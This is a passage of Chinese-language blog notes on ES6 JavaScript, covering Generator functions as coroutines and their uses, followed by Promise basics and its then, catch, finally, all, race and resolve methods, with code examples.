之所以可以不用外部变量保存状态，是因为它本身就包含了一个状态信息，即目前是否处于暂停态。 Generator 与协程： 协程是一种程序运行的方式，可以理解成“协作的线程”或“协作的函数”。 协程既可以用单线程实现（一种特殊的子例程），也可以用多线程实现（一种特殊的线程）。 （1）协程与传统子例程的差异： 传统的“子例程”采用堆栈式“后进先出”的执行方式，只有当调用的子函数完全执行完毕，才会结束执行父函数。 协程与其不同，多个线程（单线程情况下即多个函数）可以并行执行，但是只有一个线程（或函数）处于正在运行的状态，其他线程（或函数）都处于暂停态，线程（或函数）之间可以交换执行权。即一个线程（或函数）执行到一半，可以暂停执行，将执行权交给另一个线程（或函数），等到稍后收回执行权的时候，再恢复执行。这种可以并行执行、交换执行权的线程（或函数），就称为协程。 从实现上看，在内存中，子例程只使用一个栈（stack），而协程是同时存在多个栈，但只有一个栈是在运行状态，也就是说，协程是以多占用内存为代价，实现多任务的并行。 （2）协程与普通线程的差异： 第一点看出，协程适合用于多任务运行的环境。在这个意义上，它与普通的线程很相似，都有自己的执行上下文、可以分享全局变量。 它们的不同之处在于，普通线程同一时间可以有多个线程处于运行状态，但是协程中运行的协程只能有一个，其他协程都处于暂停状态。此外，普通的线程是抢先式的，到底哪个线程优先得到资源，必须由运行环境决定，但是协程是合作式的，执行权由协程自己分配。 由于 JavaScript 是单线程语言，只能保持一个调用栈。引入协程以后，每个任务可以保持自己的调用栈。这样做的最大好处，就是抛出错误的时候，可以找到原始的调用栈。不至于像异步操作的回调函数那样，一旦出错，原始的调用栈早就结束。 Generator 函数是 ES6 对协程的实现，但属于不完全实现。Generator 函数被称为“半协程”，意思是只有 Generator 函数的调用者，才能将程序的执行权还给 Generator 函数。如果是完全执行的协程，任何函数都可以让暂停的协程继续执行。 如果将 Generator 函数当作协程，完全可以将多个需要互相协作的任务写成 Generator 函数，它们之间使用yield表示式交换控制权。 Generator 与上下文： JavaScript 代码运行时，会产生一个全局的上下文环境（context，又称运行环境），包含了当前所有的变量和对象。然后，执行函数（或块级代码）的时候，又会在当前上下文环境的上层，产生一个函数运行的上下文，变成当前（active）的上下文，由此形成一个上下文环境的堆栈（context stack）。 这个堆栈是“后进先出”的数据结构，最后产生的上下文环境首先执行完成，退出堆栈，然后再执行完成它下层的上下文，直至所有代码执行完成，堆栈清空。 Generator 函数不是这样，它执行产生的上下文环境，一旦遇到yield命令，就会暂时退出堆栈，但是并不消失，里面的所有变量和对象会冻结在当前状态。等到对它执行next命令时，这个上下文环境又会重新加入调用栈，冻结的变量和对象恢复执行。 123456789101112131415function* gen() &#123; yield 1; return 2;&#125;let g = gen();console.log( g.next().value, g.next().value,);上面代码中，第一次执行g.next()时，Generator 函数gen的上下文会加入堆栈，即开始运行gen内部的代码。等遇到yield 1时，gen上下文退出堆栈，内部状态冻结。第二次执行g.next()时，gen上下文重新加入堆栈，变成当前的上下文，重新恢复执行。 12、应用 （1）异步操作的同步化表达： Generator 函数的暂停执行的效果，意味着可以把异步操作写在yield表达式里面，等到调用next方法时再往后执行。这实际上等同于不需要写回调函数了，因为异步操作的后续操作可以放在yield表达式下面，反正要等到调用next方法时再执行。所以，Generator 函数的一个重要实际意义就是用来处理异步操作，改写回调函数: 12345678910111213141516function* loadUI() &#123; showLoadingScreen(); yield loadUIDataAsynchronously(); hideLoadingScreen();&#125;var loader = loadUI();// 加载UIloader.next()// 卸载UIloader.next()上面代码中，第一次调用loadUI函数时，该函数不会执行，仅返回一个遍历器。下一次对该遍历器调用next方法，则会显示Loading界面（showLoadingScreen），并且异步加载数据（loadUIDataAsynchronously）。等到数据加载完成，再一次使用next方法，则会隐藏Loading界面。可以看到，这种写法的好处是所有Loading界面的逻辑，都被封装在一个函数，按部就班非常清晰。 Ajax 是典型的异步操作，通过 Generator 函数部署 Ajax 操作，可以用同步的方式表达: 123456789101112131415161718function* main() &#123; var result = yield request(\"http://some.url\"); var resp = JSON.parse(result); console.log(resp.value);&#125;function request(url) &#123; makeAjaxCall(url, function(response)&#123; it.next(response); &#125;);&#125;var it = main();it.next();上面代码的main函数，就是通过 Ajax 操作获取数据。可以看到，除了多了一个yield，它几乎与同步操作的写法完全一样。注意，makeAjaxCall函数中的next方法，必须加上response参数，因为yield表达式，本身是没有值的，总是等于undefined。 再看另一个例子，通过 Generator 函数逐行读取文本文件： 123456789101112function* numbers() &#123; let file = new FileReader(\"numbers.txt\"); try &#123; while(!file.eof) &#123; yield parseInt(file.readLine(), 10); &#125; &#125; finally &#123; file.close(); &#125;&#125;上面代码打开文本文件，使用yield表达式可以手动逐行读取文件。 （2）控制流管理： 如果有一个多步操作非常耗时，采用回调函数，可能会写成下面这样： 123456789step1(function (value1) &#123; step2(value1, function(value2) &#123; step3(value2, function(value3) &#123; step4(value3, function(value4) &#123; // Do something with value4 &#125;); &#125;); &#125;);&#125;); 采用 Promise 改写上面的代码： 12345678910Promise.resolve(step1) .then(step2) .then(step3) .then(step4) .then(function (value4) &#123; // Do something with value4 &#125;, function (error) &#123; // Handle any error from step1 through step4 &#125;) .done(); 上面代码把回调函数改成直线执行的形式，但加入了大量 Promise 的语法。Generator 函数可进一步改善代码运行流程： 12345678910111213141516171819202122232425262728function* longRunningTask(value1) &#123; try &#123; var value2 = yield step1(value1); var value3 = yield step2(value2); var value4 = yield step3(value3); var value5 = yield step4(value4); // Do something with value4 &#125; catch (e) &#123; // Handle any error from step1 through step4 &#125;&#125;然后，使用一个函数，按次序自动执行所有步骤。scheduler(longRunningTask(initialValue));function scheduler(task) &#123; var taskObj = task.next(task.value); // 如果Generator函数未结束，就继续调用 if (!taskObj.done) &#123; task.value = taskObj.value scheduler(task); &#125;&#125;注意，上面这种做法，只适合同步操作，即所有的task都必须是同步的，不能有异步操作。因为这里的代码一得到返回值，就继续往下执行，没有判断异步操作何时完成。如果要控制异步的操作流程，详见后面的《异步操作》一章。 下面，利用for…of循环会自动依次执行yield命令的特性，提供一种更一般的控制流管理的方法： 1234567891011121314151617181920212223242526272829let steps = [step1Func, step2Func, step3Func];function* iterateSteps(steps)&#123; for (var i=0; i&lt; steps.length; i++)&#123; var step = steps[i]; yield step(); &#125;&#125;上面代码中，数组steps封装了一个任务的多个步骤，Generator 函数iterateSteps则是依次为这些步骤加上yield命令。将任务分解成步骤之后，还可以将项目分解成多个依次执行的任务。let jobs = [job1, job2, job3];function* iterateJobs(jobs)&#123; for (var i=0; i&lt; jobs.length; i++)&#123; var job = jobs[i]; yield* iterateSteps(job.steps); &#125;&#125;上面代码中，数组jobs封装了一个项目的多个任务，Generator 函数iterateJobs则是依次为这些任务加上yield*命令。最后，就可以用for...of循环一次性依次执行所有任务的所有步骤。for (var step of iterateJobs(jobs))&#123; console.log(step.id);&#125; for…of的本质是一个while循环，所以上面的代码实质上执行的是下面的逻辑: 12345678var it = iterateJobs(jobs);var res = it.next();while (!res.done)&#123; var result = res.value; // ... res = it.next();&#125; （3）部署 Iterator 接口： 利用 Generator 函数，可以在任意对象上部署 Iterator 接口。 123456789101112131415161718function* iterEntries(obj) &#123; let keys = Object.keys(obj); for (let i=0; i &lt; keys.length; i++) &#123; let key = keys[i]; yield [key, obj[key]]; &#125;&#125;let myObj = &#123; foo: 3, bar: 7 &#125;;for (let [key, value] of iterEntries(myObj)) &#123; console.log(key, value);&#125;// foo 3// bar 7上述代码中，myObj是一个普通对象，通过iterEntries函数，就有了 Iterator 接口。即可以在任意对象上部署next方法。 下面是一个对数组部署 Iterator 接口的例子，尽管数组原生具有这个接口。 12345678910111213function* makeSimpleGenerator(array)&#123; var nextIndex = 0; while(nextIndex &lt; array.length)&#123; yield array[nextIndex++]; &#125;&#125;var gen = makeSimpleGenerator(['yo', 'ya']);gen.next().value // 'yo'gen.next().value // 'ya'gen.next().done // true （4）作为数据结构： Generator 可以看作是数据结构，更确切地说，可以看作是一个数组结构，因为 Generator 函数可以返回一系列的值，这意味着它可以对任意表达式，提供类似数组的接口。 1234567891011121314151617181920212223function* doStuff() &#123; yield fs.readFile.bind(null, 'hello.txt'); yield fs.readFile.bind(null, 'world.txt'); yield fs.readFile.bind(null, 'and-such.txt');&#125;上面代码依次返回三个函数，由于使用了 Generator 函数，导致可以像处理数组那样，处理这三个返回的函数。for (task of doStuff()) &#123; // task是一个函数，可以像回调函数那样使用它&#125;实际上，如果用 ES5 表达，完全可以用数组模拟 Generator 的这种用法。function doStuff() &#123; return [ fs.readFile.bind(null, 'hello.txt'), fs.readFile.bind(null, 'world.txt'), fs.readFile.bind(null, 'and-such.txt') ];&#125;两相一比较，可以看出 Generator 使得数据或者操作，具备了类似数组的接口。 标注： 参考资料1：http://es6.ruanyifeng.com/#docs/promise","categories":[{"name":"前端","slug":"前端","permalink":"http://liuxuewen-site.github.io/categories/前端/"}],"tags":[{"name":"前端-ES6","slug":"前端-ES6","permalink":"http://liuxuewen-site.github.io/tags/前端-ES6/"}]},{"title":"《ES6标准入门》之异步编程Promise","slug":"ES6-ryf-promise","date":"2018-04-02T01:58:40.000Z","updated":"2019-01-25T10:04:06.392Z","comments":true,"path":"2018/04/02/ES6-ryf-promise/","link":"","permalink":"http://liuxuewen-site.github.io/2018/04/02/ES6-ryf-promise/","excerpt":"","text":"一、Promise1、基本概念 ： Promise 是异步编程的一种解决方案。从语法上说，Promise 是一个对象。promise实现异步编程，是因为每一次promise的时候，都会返回一个promise对象，通过调用该对象的then方法，异步执行then里面的事件。 纠其原理的话： 其实Promise内部有一个 defers 队列存放事件，promise的then方法的作用是用来订阅事件的，每次调用then方法就会往defers队列中放入一个事件，当异步操作完成时，promise的resolve方法标示前一个异步过程完成并从defers队列中取出第一个事件执行，并返回当前对象保证链式调用，以此类推，就完成了所有异步过程的队列执行。 Promise 对象的特点： 1）对象的状态不受外界影响。Promise对象有三种状态：pending（进行中）、fulfilled（已成功）和rejected（已失败）。只有异步操作的结果，可以决定当前是哪一种状态，任何其他操作都无法改变这个状态。 2）一旦状态改变就不会再变，任何时候都可以得到这个结果。Promise对象的状态改变有两种可能：pending变fulfilled和pending变rejected。只要这两种情况发生，状态就凝固了，会一直保持这个结果，称为 resolved已定型（后面的resolved统一只指fulfilled状态）。如果改变已经发生，你再对Promise对象添加回调函数，也会立即得到这个结果。这与事件（Event）完全不同，事件的特点是，如果你错过了它，再去监听，是得不到结果的。 Promise也有一些缺点： 1）无法取消Promise，一旦新建它就会立即执行，无法中途取消。 2）如果不设置回调函数，Promise内部抛出的错误，不会反应到外部。 3）当处于pending状态时，无法得知目前进展到哪一个阶段（刚刚开始还是即将完成）。 2、基本用法： 12345678910111213141516171819ES6 规定，Promise对象是一个构造函数，用来生成Promise实例:const promise = new Promise(function(resolve, reject) &#123; // ... some code if (/* 异步操作成功 */)&#123; resolve(value); &#125; else &#123; reject(error); &#125;&#125;);Promise构造函数接受一个函数作为参数，该函数的两个参数分别是resolve和reject。它们是两个函数，由 JavaScript 引擎提供，不用自己部署。resolve函数的作用是，将Promise对象的状态从“未完成”变为“成功”（即从 pending 变为 resolved），在异步操作成功时调用，并将异步操作的结果，作为参数传递出去；reject函数的作用是，将Promise对象的状态从“未完成”变为“失败”（即从 pending 变为 rejected），在异步操作失败时调用，并将异步操作报出的错误，作为参数传递出去。 123456789101112Promise实例生成以后，可以用then方法分别指定resolved状态和rejected状态的回调函数:promise.then(function(value) &#123; // success&#125;, function(error) &#123; // failure&#125;);then方法可以接受两个回调函数作为参数。第一个回调函数是Promise对象的状态变为resolved时调用，第二个回调函数是Promise对象的状态变为rejected时调用。其中，第二个函数是可选的。这两个函数都接受Promise对象传出的值作为参数。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071721）Promise对象的简单例子:function timeout(ms) &#123; return new Promise((resolve, reject) =&gt; &#123; setTimeout(resolve, ms, 'done'); &#125;);&#125;timeout(100).then((value) =&gt; &#123; console.log(value);&#125;);// done上面代码中，timeout方法返回一个Promise实例，表示一段时间以后才会发生的结果。过了指定的时间（ms参数）以后，Promise实例的状态变为resolved，就会触发then方法绑定的回调函数。2）异步加载图片的例子:function loadImageAsync(url) &#123; return new Promise(function(resolve, reject) &#123; const image = new Image(); image.onload = function() &#123; resolve(image); &#125;; image.onerror = function() &#123; reject(new Error('Could not load image at ' + url)); &#125;; image.src = url; &#125;);&#125;上面代码中，使用Promise包装了一个图片加载的异步操作。如果加载成功，就调用resolve方法，否则就调用reject方法。3）实现的 Ajax 操作的例子：const getJSON = function(url) &#123; const promise = new Promise(function(resolve, reject)&#123; const handler = function() &#123; if (this.readyState !== 4) &#123; return; &#125; if (this.status === 200) &#123; resolve(this.response); &#125; else &#123; reject(new Error(this.statusText)); &#125; &#125;; const client = new XMLHttpRequest(); client.open(\"GET\", url); client.onreadystatechange = handler; client.responseType = \"json\"; client.setRequestHeader(\"Accept\", \"application/json\"); client.send(); &#125;); return promise;&#125;;getJSON(\"/posts.json\").then(function(json) &#123; console.log('Contents: ' + json);&#125;, function(error) &#123; console.error('出错了', error);&#125;);上面代码中，getJSON是对 XMLHttpRequest 对象的封装，用于发出一个针对 JSON 数据的 HTTP 请求，并且返回一个Promise对象。需要注意的是，在getJSON内部，resolve函数和reject函数调用时，都带有参数。 123456789101112131415161718192021222324252627282930313233343536如果调用resolve函数和reject函数时带有参数，那么它们的参数会被传递给回调函数。reject函数的参数通常是Error对象的实例，表示抛出的错误；resolve函数的参数除了正常的值以外，还可能是另一个 Promise 实例，比如像下面这样:const p1 = new Promise(function (resolve, reject) &#123; // ...&#125;);const p2 = new Promise(function (resolve, reject) &#123; // ... resolve(p1);&#125;)上面代码中，p1和p2都是 Promise 的实例，但是p2的resolve方法将p1作为参数，即一个异步操作的结果是返回另一个异步操作。这时p1的状态就会传递给p2，也就是说，p1的状态决定了p2的状态。如果p1的状态是pending，那么p2的回调函数就会等待p1的状态改变；如果p1的状态已经是resolved或者rejected，那么p2的回调函数将会立刻执行。const p1 = new Promise(function (resolve, reject) &#123; setTimeout(() =&gt; reject(new Error('fail')), 3000)&#125;)const p2 = new Promise(function (resolve, reject) &#123; setTimeout(() =&gt; resolve(p1), 1000)&#125;)p2 .then(result =&gt; console.log(result)) .catch(error =&gt; console.log(error))// Error: fail上面代码中，p1是一个 Promise，3 秒之后变为rejected,p2的状态在 1 秒之后改变，resolve方法返回的是p1。由于p2返回的是另一个 Promise，导致p2自己的状态无效了，由p1的状态决定p2的状态。所以，后面的then语句都变成针对后者（p1）。又过了 2 秒，p1变为rejected，导致触发catch方法指定的回调函数。 12345678910111213141516171819Promise 新建后就会立即执行:let promise = new Promise(function(resolve, reject) &#123; console.log('Promise'); resolve();&#125;);promise.then(function() &#123; console.log('resolved.');&#125;);console.log('Hi!');// Promise// Hi!// resolved上面代码中，Promise 新建后立即执行，所以首先输出的是Promise。然后，then方法指定的回调函数，将在当前脚本所有同步任务执行完才会执行，所以resolved最后输出。 1234567891011121314151617181920212223调用resolve或reject并不会终结 Promise 的参数函数的执行:new Promise((resolve, reject) =&gt; &#123; resolve(1); console.log(2);&#125;).then(r =&gt; &#123; console.log(r);&#125;);// 2// 1上面代码中，调用resolve(1)以后，后面的console.log(2)还是会执行，并且会首先打印出来。这是因为立即 resolved 的 Promise 是在本轮事件循环的末尾执行，总是晚于本轮循环的同步任务。一般来说，调用resolve或reject以后，Promise 的使命就完成了，后继操作应该放到then方法里面，而不应该直接写在resolve或reject的后面。所以，最好在它们前面加上return语句，这样就不会有意外。new Promise((resolve, reject) =&gt; &#123; return resolve(1); // 后面的语句不会执行 console.log(2);&#125;) 3、Promise.prototype.then() Promise 实例具有then方法，即then方法是定义在原型对象Promise.prototype上的。它的作用是为 Promise 实例添加状态改变时的回调函数。then方法的第一个参数是resolved状态的回调函数，第二个参数（可选）是rejected状态的回调函数。 then方法返回的是一个新的Promise实例（注意不是原来那个Promise实例）。因此可以采用链式写法，即then方法后面再调用另一个then方法。 12345678getJSON(\"/posts.json\").then(function(json) &#123; return json.post;&#125;).then(function(post) &#123; // ...&#125;);上面的代码使用then方法，依次指定了两个回调函数。第一个回调函数完成以后，会将返回结果作为参数，传入第二个回调函数。 采用链式的then，可以指定一组按照次序调用的回调函数。这时，前一个回调函数，有可能返回的还是一个Promise对象（即有异步操作），这时后一个回调函数，就会等待该Promise对象的状态发生变化，才会被调用。 1234567891011getJSON(\"/post/1.json\").then(function(post) &#123; return getJSON(post.commentURL);&#125;).then(function funcA(comments) &#123; console.log(\"resolved: \", comments);&#125;, function funcB(err)&#123; console.log(\"rejected: \", err);&#125;);上面代码中，第一个then方法指定的回调函数，返回的是另一个Promise对象。这时，第二个then方法指定的回调函数，就会等待这个新的Promise对象状态发生变化。如果变为resolved，就调用funcA，如果状态变为rejected，就调用funcB。 如果采用箭头函数，上面的代码可以写得更简洁。 123456getJSON(\"/post/1.json\").then( post =&gt; getJSON(post.commentURL)).then( comments =&gt; console.log(\"resolved: \", comments), err =&gt; console.log(\"rejected: \", err)); 4、Promise.prototype.catch() Promise.prototype.catch方法是.then(null, rejection)的别名，用于指定发生错误时的回调函数。 123456789101112131415161718getJSON('/posts.json').then(function(posts) &#123; // ...&#125;).catch(function(error) &#123; // 处理 getJSON 和 前一个回调函数运行时发生的错误 console.log('发生错误！', error);&#125;);上面代码中，getJSON方法返回一个 Promise 对象，如果该对象状态变为resolved，则会调用then方法指定的回调函数；如果异步操作抛出错误，状态就会变为rejected，就会调用catch方法指定的回调函数，处理这个错误。另外，then方法指定的回调函数，如果运行中抛出错误，也会被catch方法捕获。p.then((val) =&gt; console.log('fulfilled:', val)) .catch((err) =&gt; console.log('rejected', err));// 等同于p.then((val) =&gt; console.log('fulfilled:', val)) .then(null, (err) =&gt; console.log(\"rejected:\", err)); 看个例子： 1234567891011121314151617181920212223242526272829303132const promise = new Promise(function(resolve, reject) &#123; throw new Error('test');&#125;);promise.catch(function(error) &#123; console.log(error);&#125;);// Error: test上面代码中，promise抛出一个错误，就被catch方法指定的回调函数捕获。注意，上面的写法与下面两种写法是等价的。// 写法一const promise = new Promise(function(resolve, reject) &#123; try &#123; throw new Error('test'); &#125; catch(e) &#123; reject(e); &#125;&#125;);promise.catch(function(error) &#123; console.log(error);&#125;);// 写法二const promise = new Promise(function(resolve, reject) &#123; reject(new Error('test'));&#125;);promise.catch(function(error) &#123; console.log(error);&#125;);比较上面两种写法，可以发现reject方法的作用，等同于抛出错误。 如果 Promise 状态已经变成resolved，再抛出错误是无效的: 1234567891011const promise = new Promise(function(resolve, reject) &#123; resolve('ok'); throw new Error('test');&#125;);promise .then(function(value) &#123; console.log(value) &#125;) .catch(function(error) &#123; console.log(error) &#125;);// ok上面代码中，Promise 在resolve语句后面，再抛出错误，不会被捕获，等于没有抛出。因为 Promise 的状态一旦改变，就永久保持该状态，不会再变了。 Promise 对象的错误具有“冒泡”性质，会一直向后传递，直到被捕获为止。即错误总是会被下一个catch语句捕获。 12345678910getJSON('/post/1.json').then(function(post) &#123; return getJSON(post.commentURL);&#125;).then(function(comments) &#123; // some code&#125;).catch(function(error) &#123; // 处理前面三个Promise产生的错误&#125;);上面代码中，一共有三个 Promise 对象：一个由getJSON产生，两个由then产生。它们之中任何一个抛出的错误，都会被最后一个catch捕获。 一般来说，不要在then方法里面定义 Reject 状态的回调函数（即then的第二个参数），总是使用catch方法。 1234567891011121314151617181920// badpromise .then(function(data) &#123; // success &#125;, function(err) &#123; // error &#125;);// goodpromise .then(function(data) &#123; //cb // success &#125;) .catch(function(err) &#123; // error &#125;);上面代码中，第二种写法要好于第一种写法，理由是第二种写法可以捕获前面then方法执行中的错误，也更接近同步的写法（try/catch）。因此，建议总是使用catch方法，而不使用then方法的第二个参数。 跟传统的try/catch代码块不同的是，如果没有使用catch方法指定错误处理的回调函数，Promise 对象抛出的错误不会传递到外层代码，即不会有任何反应。 1234567891011121314151617181920212223242526272829303132const someAsyncThing = function() &#123; return new Promise(function(resolve, reject) &#123; // 下面一行会报错，因为x没有声明 resolve(x + 2); &#125;);&#125;;someAsyncThing().then(function() &#123; console.log('everything is great');&#125;);setTimeout(() =&gt; &#123; console.log(123) &#125;, 2000);// Uncaught (in promise) ReferenceError: x is not defined// 123上面代码中，someAsyncThing函数产生的 Promise 对象，内部有语法错误。浏览器运行到这一行，会打印出错误提示ReferenceError: x is not defined，但是不会退出进程、终止脚本执行，2 秒之后还是会输出123。这就是说，Promise 内部的错误不会影响到 Promise 外部的代码，通俗的说法就是“Promise 会吃掉错误”。这个脚本放在服务器执行，退出码就是0（即表示执行成功）。不过，Node 有一个unhandledRejection事件，专门监听未捕获的reject错误，上面的脚本会触发这个事件的监听函数，可以在监听函数里面抛出错误。process.on('unhandledRejection', function (err, p) &#123; throw err;&#125;);上面代码中，unhandledRejection事件的监听函数有两个参数，第一个是错误对象，第二个是报错的 Promise 实例，它可以用来了解发生错误的环境信息。注意，Node 有计划在未来废除unhandledRejection事件。如果 Promise 内部有未捕获的错误，会直接终止进程，并且进程的退出码不为 0。 再看个例子： 1234567891011const promise = new Promise(function (resolve, reject) &#123; resolve('ok'); setTimeout(function () &#123; throw new Error('test') &#125;, 0)&#125;);promise.then(function (value) &#123; console.log(value) &#125;);// ok// Uncaught Error: test上面代码中，Promise 指定在下一轮“事件循环”再抛出错误。到了那个时候，Promise 的运行已经结束了，所以这个错误是在 Promise 函数体外抛出的，会冒泡到最外层，成了未捕获的错误。 一般总是建议，Promise 对象后面要跟catch方法，这样可以处理 Promise 内部发生的错误。catch方法返回的还是一个 Promise 对象，因此后面还可以接着调用then方法。 12345678910111213141516171819202122232425262728293031const someAsyncThing = function() &#123; return new Promise(function(resolve, reject) &#123; // 下面一行会报错，因为x没有声明 resolve(x + 2); &#125;);&#125;;someAsyncThing().catch(function(error) &#123; console.log('oh no', error);&#125;).then(function() &#123; console.log('carry on');&#125;);// oh no [ReferenceError: x is not defined]// carry on上面代码运行完catch方法指定的回调函数，会接着运行后面那个then方法指定的回调函数。如果没有报错，则会跳过catch方法。Promise.resolve().catch(function(error) &#123; console.log('oh no', error);&#125;).then(function() &#123; console.log('carry on');&#125;);// carry on上面的代码因为没有报错，跳过了catch方法，直接执行后面的then方法。此时，要是then方法里面报错，就与前面的catch无关了。 catch方法之中，还能再抛出错误。 1234567891011121314151617181920212223242526272829303132333435const someAsyncThing = function() &#123; return new Promise(function(resolve, reject) &#123; // 下面一行会报错，因为x没有声明 resolve(x + 2); &#125;);&#125;;someAsyncThing().then(function() &#123; return someOtherAsyncThing();&#125;).catch(function(error) &#123; console.log('oh no', error); // 下面一行会报错，因为 y 没有声明 y + 2;&#125;).then(function() &#123; console.log('carry on');&#125;);// oh no [ReferenceError: x is not defined]上面代码中，catch方法抛出一个错误，因为后面没有别的catch方法了，导致这个错误不会被捕获，也不会传递到外层。如果改写一下，结果就不一样了。omeAsyncThing().then(function() &#123; return someOtherAsyncThing();&#125;).catch(function(error) &#123; console.log('oh no', error); // 下面一行会报错，因为y没有声明 y + 2;&#125;).catch(function(error) &#123; console.log('carry on', error);&#125;);// oh no [ReferenceError: x is not defined]// carry on [ReferenceError: y is not defined]上面代码中，第二个catch方法用来捕获，前一个catch方法抛出的错误。 5、Promise.prototype.finally() finally方法用于指定不管 Promise 对象最后状态如何，都会执行的操作。finally方法的回调函数不接受任何参数，意味着没有办法知道前面的Promise状态是fulfilled还是rejected，这表明finally方法里面的操作，应该是与状态无关的，不依赖于 Promise 的执行结果。 1234567891011121314promise.then(result =&gt; &#123;···&#125;).catch(error =&gt; &#123;···&#125;).finally(() =&gt; &#123;···&#125;);上面代码中，不管promise最后的状态，在执行完then或catch指定的回调函数以后，都会执行finally方法指定的回调函数。server.listen(port) .then(function () &#123; // ... &#125;) .finally(server.stop);上面代码中，服务器使用 Promise 处理请求，然后使用finally方法关掉服务器。 finally本质上是then方法的特例： 1234567891011121314151617181920promise.finally(() =&gt; &#123; // 语句&#125;);// 等同于promise.then( result =&gt; &#123; // 语句 return result; &#125;, error =&gt; &#123; // 语句 throw error; &#125;);上面代码中，如果不使用finally方法，同样的语句需要为成功和失败两种情况各写一次。有了finally方法，则只需要写一次。 它的实现也很简单: 123456789Promise.prototype.finally = function (callback) &#123; let P = this.constructor; return this.then( value =&gt; P.resolve(callback()).then(() =&gt; value), reason =&gt; P.resolve(callback()).then(() =&gt; &#123; throw reason &#125;) );&#125;;上面代码中，不管前面的 Promise 是fulfilled还是rejected，都会执行回调函数callback。 从上面的实现还可以看到，finally方法总是会返回原来的值： 1234567891011// resolve 的值是 undefinedPromise.resolve(2).then(() =&gt; &#123;&#125;, () =&gt; &#123;&#125;)// resolve 的值是 2Promise.resolve(2).finally(() =&gt; &#123;&#125;)// reject 的值是 undefinedPromise.reject(3).then(() =&gt; &#123;&#125;, () =&gt; &#123;&#125;)// reject 的值是 3Promise.reject(3).finally(() =&gt; &#123;&#125;) 6、Promise.all() Promise.all方法用于将多个 Promise 实例，包装成一个新的 Promise 实例。 1234567891011const p = Promise.all([p1, p2, p3]);上面代码中，Promise.all方法接受一个数组作为参数，p1、p2、p3都是 Promise 实例，如果不是，就会先调用下面讲到的Promise.resolve方法，将参数转为 Promise 实例，再进一步处理。（Promise.all方法的参数可以不是数组，但必须具有 Iterator 接口，且返回的每个成员都是 Promise 实例。）p的状态由p1、p2、p3决定，分成两种情况。1）只有p1、p2、p3的状态都变成fulfilled，p的状态才会变成fulfilled，此时p1、p2、p3的返回值组成一个数组，传递给p的回调函数。2）只要p1、p2、p3之中有一个被rejected，p的状态就变成rejected，此时第一个被reject的实例的返回值，会传递给p的回调函数。 具体的例子: 123456789101112131415161718192021222324252627282930// 生成一个Promise对象的数组const promises = [2, 3, 5, 7, 11, 13].map(function (id) &#123; return getJSON('/post/' + id + \".json\");&#125;);Promise.all(promises).then(function (posts) &#123; // ...&#125;).catch(function(reason)&#123; // ...&#125;);上面代码中，promises是包含 6 个 Promise 实例的数组，只有这6个实例的状态都变成fulfilled，或者其中有一个变为rejected，才会调用Promise.all方法后面的回调函数。const databasePromise = connectDatabase();const booksPromise = databasePromise .then(findAllBooks);const userPromise = databasePromise .then(getCurrentUser);Promise.all([ booksPromise, userPromise]).then(([books, user]) =&gt; pickTopRecommentations(books, user));上面代码中，booksPromise和userPromise是两个异步操作，只有等到它们的结果都返回了，才会触发pickTopRecommentations这个回调函数。 如果作为参数的 Promise 实例，自己定义了catch方法，那么它一旦被rejected，并不会触发Promise.all()的catch方法: 1234567891011121314151617181920212223242526272829303132333435363738const p1 = new Promise((resolve, reject) =&gt; &#123; resolve('hello');&#125;).then(result =&gt; result).catch(e =&gt; e);const p2 = new Promise((resolve, reject) =&gt; &#123; throw new Error('报错了');&#125;).then(result =&gt; result).catch(e =&gt; e);Promise.all([p1, p2]).then(result =&gt; console.log(result)).catch(e =&gt; console.log(e));// [\"hello\", Error: 报错了]上面代码中，p1会resolved，p2首先会rejected，但是p2有自己的catch方法，该方法返回的是一个新的Promise实例，p2指向的实际上是这个实例。该实例执行完catch方法后，也会变成resolved，导致Promise.all()方法参数里面的两个实例都会resolved，因此会调用then方法指定的回调函数，而不会调用catch方法指定的回调函数。const p1 = new Promise((resolve, reject) =&gt; &#123; resolve('hello');&#125;).then(result =&gt; result);const p2 = new Promise((resolve, reject) =&gt; &#123; throw new Error('报错了');&#125;).then(result =&gt; result);Promise.all([p1, p2]).then(result =&gt; console.log(result)).catch(e =&gt; console.log(e));// Error: 报错了上面代码中，如果p2没有自己的catch方法，就会调用Promise.all()的catch方法。 7、Promise.race() Promise.race方法同样是将多个 Promise 实例，包装成一个新的 Promise 实例。 1234567const p = Promise.race([p1, p2, p3]);上面代码中，只要p1、p2、p3之中有一个实例率先改变状态，p的状态就跟着改变。那个率先改变的 Promise 实例的返回值，就传递给p的回调函数。Promise.race方法的参数与Promise.all方法一样，如果不是 Promise 实例，就会先调用下面讲到的Promise.resolve方法，将参数转为 Promise 实例，再进一步处理。 看个例子： 123456789101112const p = Promise.race([ fetch('/resource-that-may-take-a-while'), new Promise(function (resolve, reject) &#123; setTimeout(() =&gt; reject(new Error('request timeout')), 5000) &#125;)]);p.then(console.log).catch(console.error);上面代码中，如果5秒之内fetch方法无法返回结果，变量p的状态就会变为rejected，从而触发catch方法指定的回调函数。 8、Promise.resolve() Promise.resolve方法可将现有对象转为 Promise 对象: 123const jsPromise = Promise.resolve($.ajax('/whatever.json'));上面代码将 jQuery 生成的deferred对象，转为一个新的 Promise 对象。 Promise.resolve等价于下面的写法: 12345Promise.resolve('foo')// 等价于new Promise(resolve =&gt; resolve('foo')) Promise.resolve方法的参数分成四种情况: 123（1）参数是一个 Promise 实例如果参数是 Promise 实例，那么Promise.resolve将不做任何修改、原封不动地返回这个实例。 1234567891011121314151617181920212223（2）参数是一个 thenable 对象thenable对象指的是具有then方法的对象，比如下面这个对象:let thenable = &#123; then: function(resolve, reject) &#123; resolve(42); &#125;&#125;;Promise.resolve方法会将这个对象转为 Promise 对象，然后就立即执行thenable对象的then方法。let thenable = &#123; then: function(resolve, reject) &#123; resolve(42); &#125;&#125;;let p1 = Promise.resolve(thenable);p1.then(function(value) &#123; console.log(value); // 42&#125;);上面代码中，thenable对象的then方法执行后，对象p1的状态就变为resolved，从而立即执行最后那个then方法指定的回调函数，输出 42。 1234567891011121314（3）参数不是具有then方法的对象，或根本就不是对象:如果参数是一个原始值或是一个不具有then方法的对象，则Promise.resolve方法返回一个新的 Promise 对象，状态为resolved。const p = Promise.resolve('Hello');p.then(function (s)&#123; console.log(s)&#125;);// Hello上面代码生成一个新的Promise对象的实例p。由于字符串Hello不属于异步操作（判断方法是字符串对象不具有 then 方法），返回 Promise 实例的状态从一生成就是resolved，所以回调函数会立即执行。Promise.resolve方法的参数，会同时传给回调函数。 